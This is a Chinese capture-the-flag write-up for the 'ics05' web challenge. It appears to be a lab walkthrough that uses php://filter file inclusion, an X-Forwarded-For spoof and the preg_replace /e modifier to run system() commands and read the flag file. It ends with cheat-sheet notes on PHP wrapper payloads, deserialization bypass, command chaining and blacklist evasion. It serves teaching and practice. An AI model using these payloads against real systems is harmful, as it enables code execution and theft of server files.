xman_web_ics05

扫描网址得

>[19:56:55] 200 -    5KB - /index.html                                           
>
>[19:56:55] 200 -    2KB - /index.php 
>
>[19:56:55] 200 -    2KB - /index.php/login/

访问http://111.198.29.45:39337/index.php/login后点击网页上的文字后，url变成

`http://111.198.29.45:39337/index.php/login?page=index`

于是猜测可以php://input

> http://111.198.29.45:39337/index.php/login?page=php://filter/read=convert.base64-encode/resource=index.php

得到index.php的内容,base64解码后为

```php
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>è®¾å¤ç»´æ¤ä¸­å¿</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">äºå¹³å°è®¾å¤ç»´æ¤ä¸­å¿</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>è®¾å¤åè¡¨</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- è¿éç checked çç¶æåªæ¯æ¼ç¤º -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="å¼|å³" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: 'è®¾å¤å', templet: '#nameTpl' },
                     { field: 'area', title: 'åºå' },
                     { field: 'status', title: 'ç»´æ¤ç¶æ', minWidth: 120, sort: true },
                     { field: 'check', title: 'è®¾å¤å¼å³', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //å¯¼èªçhoverææãäºçº§èåç­åè½ï¼éè¦ä¾èµelementæ¨¡å
        //çå¬å¯¼èªç¹å»
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//æ¹ä¾¿çå®ç°è¾å¥è¾åºçåè½,æ­£å¨å¼åä¸­çåè½ï¼åªè½åé¨äººåæµè¯

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
?>

</body>

</html>

```

看见最后有`$_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1'`的判断条件才会调用`preg_replace`函数

**!! preg_replace()函数有漏洞** 见https://www.jb51.net/article/145649.htm

>preg_replace( pattern , replacement , subject ) : 当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中)


所以在访问之前先给请求头加上 X-Forwarded-For：127.0.0.1

（具体操作可以是先burpsuite抓包，加上后forward就可以显示在浏览器中）

>GET /index.php HTTP/1.1
>Host: 111.198.29.45:39337
>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>Referer: http://111.198.29.45:39337/
>Connection: close
>Cookie: PHPSESSID=rj6tgg529u9r3ei026pemdf425
>Upgrade-Insecure-Requests: 1
>Cache-Control: max-age=0
>X-Forwarded-For: 127.0.0.1

界面就多了一行`Welcome My Admin !` 

随后利用preg_replace的漏洞对系统里flag相关文件进行查找

> 111.198.29.45:39337/index.php?pat=/test/e&rep=system('find / -iname flag')&sub=test

*在burpsuite中空格需要使用%20代替*

得到flag文件的路径

>Welcome My Admin ! 
>/var/www/html/s3chahahaDir/flag

最后

> 111.198.29.45:39337/index.php?pat=/test/e&rep=system('cat/var/www/html/s3chahahaDir/flag/flag.php')&sub=test

>Welcome My Admin ! 
>
><?php $flag = 'cyberpeace{d5affd241d93965bf3d575c7de26c14d}';?>


#### 通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码
假设如下一个场景

(1) http://vulnerable/fileincl/example1.php?page=intro.php（该php文件包含LFI漏洞)

(2) 但是你没有地方可以upload你的webshell代码

(3) LFI只能读取到非php文件的源码（因为无法解析执行 只能被爆菊花）

(4) 如果你能读取到config.php之类文件 或许可以直接拿到数据库账号远程入侵进去

 LFI如何读取到php文件的源码?

于是给大家做个演示 如果我正常用LFI去读/sqli/db.php文件 是无法读取它的源码 它会被当做php文件被执行

http://vulnerable/fileincl/example1.php?page=../sqli/db.php

这样做可以把指定php文件的源码以base64方式编码并被显示出来

http://vulnerable/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=../sqli/db.php

/sqli/db.php源码base64编码后的内容显示如下

PD9waHAgCiAgJGxuayA9IG15c3FsX2Nvbm5lY3QoImxvY2FsaG9zdCIsICJwZW50ZXN0ZXJsYWIiLCAicGVudGVzdGVybGFiIik7CiAgJGRiID0gbXlzcWxfc2VsZWN0X2RiKCdleGVyY2lzZXMnLCAkbG5rKTsKPz4K 然后我们再去进行base64解码 解码后/sqli/db.php文件的源码一览无遗

#### php漏洞函数
1. parse_url()
   parse_url()的小trick，通过：'///x.php?key=value'的方式可以使其返回'NULL'，或者xxxx///serialized/index.php ?file=hint.php，必须作用在域名根目录下。漏洞问题只存在于php5.4.7以后存在此漏洞。
2. wakeup()
   php反序列化 ，通过增加对象属性个数，绕过wakeup方法(CVE-2016-7124)
3. base_convert()
   base_convert()可以任意进制转换,参考,数字转换工具

#### php伪协议
1. ?file=php://filter/read=convert.base64-encode/resource=index.php

2. ?file=php://filter/convert.base64-encode/resource=index.php

3. ?file=phar://test.zip/phpinfo.txt或者?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt---->php 版本大于等于 php5.3.0

4. ?file=zip://F:/web/phpStudy/WWW/serialized/okshell.zip%23okshell.png-->需要绝对路径

5. ?file=compress.bzip2://./file.jpg---->可执行file.jpg里面代码。

6. ?file=data:text/plain;base64,ZmxhZy5waHA=--->allow_url_fopen ：on-->读取flag

   ?file=data:text/plain;base64,PD9waHAgcmVhZGZpbGUoIi4vZmxhZy5waHAiKTs/Pg==

#### 命令执行
通配符&、&&、;、||、|、
例如cmd1 = ls cmd2=ll

1. cmd1 && cmd2 先执行cmd1,若cmd1执行成功，输出cmd1的执行结果，在执行cmd2；若cmd1执行失败， 不会执行cmd2。

2. cmd1 & cmd2 先执行cmd1,不管cmd1是否成功，都会执行cmd2。

3. cmd1 ; cmd2  先执行cmd1,不管cmd1是否成功，都会执行cmd2。

4. cmd1 | cmd2  将cmd1的输出作为cmd2的输入，并且只输出cmd2的结果。不管cmd1是否成功执行，都会执行cmd2。

5. cmd1 || cmd2 先执行cmd1,若cmd1执行成功，输出cmd1的执行结果， 不会执行cmd2。否则执行cmd2。

   
#### 绕过黑名单
   1、ls ----> 执行ls命令：a=l;b=s;$a$b
   2、空白 --->执行cat命令: cat flag ----> cat<>flag